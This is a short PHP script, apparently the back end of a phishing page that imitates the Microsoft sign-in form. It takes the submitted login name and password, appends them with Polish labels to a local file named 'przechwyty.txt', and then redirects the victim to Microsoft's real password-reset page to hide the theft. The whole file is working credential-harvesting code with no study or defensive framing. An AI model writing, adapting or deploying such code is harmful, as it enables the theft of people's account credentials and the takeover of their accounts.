<?php

file_put_contents("przechwyty.txt", "Microsoft Login: " . $_POST['loginfmt'] . " Hasło: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
?>